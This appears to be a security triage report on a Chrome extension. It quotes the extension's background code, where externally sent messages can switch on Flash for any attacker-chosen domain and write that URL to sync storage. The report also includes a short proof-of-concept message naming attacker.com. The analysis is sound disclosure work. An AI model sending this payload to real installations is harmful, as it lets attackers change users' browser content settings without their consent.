# CoCo Analysis: fdkgolkkimdnnjaeiogdciekaflaellb

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2 (related flows)

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_sync_set_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/fdkgolkkimdnnjaeiogdciekaflaellb/opgen_generated_files/bg.js
Line 1000: authorizeFlash(request.url);
Line 966: const ruta = apiUrl.split(".");

**Code:**

```javascript
// Background script - External message handler (bg.js)
chrome.runtime.onMessageExternal.addListener(function(
  request,
  sender,
  sendResponse
) {
  if (request) {
    if (request.message) {
      if (request.message === "version") {
        authorizeFlash(request.url);  // ← attacker-controlled URL
        passStorage(request.url);
        chrome.storage.sync.set({
          externalUrl: request.url  // ← storage sink
        });
        sendResponse({ version: 1.0 });
      }
    }
  }
  return true;
});

function authorizeFlash(apiUrl) {
  const ruta = apiUrl.split(".");  // ← attacker-controlled
  const pattern = `*://*.${ruta[ruta.length - 2]}.${ruta[ruta.length - 1]}/*`;
  chrome.contentSettings.plugins.set(
    {
      primaryPattern: pattern,  // ← attacker controls which domain gets Flash enabled
      setting: "allow",
      scope: "regular"
    },
    err => {
      console.log(err);
    }
  );
}

function passStorage(apiUrl) {
  chrome.runtime.sendMessage(null, {
    msg: "route_updated",
    data: {
      apiUrl  // ← broadcasts attacker URL internally
    }
  });
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains

**Attack:**

```javascript
// From any whitelisted domain (e.g., juegosjuegos.com, pomu.com, etc.)
chrome.runtime.sendMessage(
  "fdkgolkkimdnnjaeiogdciekaflaellb",  // extension ID
  {
    message: "version",
    url: "https://attacker.com"  // attacker-controlled URL
  },
  function(response) {
    console.log("Flash enabled for attacker.com");
  }
);
```

**Impact:** While CoCo detected the storage.sync.set sink, the primary vulnerability is that an attacker (from any of the 30+ whitelisted domains in `externally_connectable`) can force the extension to enable Flash plugin permissions for arbitrary domains via `chrome.contentSettings.plugins.set()`. The attacker controls the URL pattern that gets Flash access enabled. This allows the attacker to:

1. Enable Flash on attacker-controlled domains
2. Potentially exploit Flash vulnerabilities on those domains
3. Modify content settings without user consent
4. Store the malicious URL in sync storage (though no retrieval path to attacker exists)

The extension has the required "contentSettings" and "storage" permissions in manifest.json. Per the methodology, we ignore the `externally_connectable` whitelist - since even ONE whitelisted domain can exploit this, it's a TRUE POSITIVE.
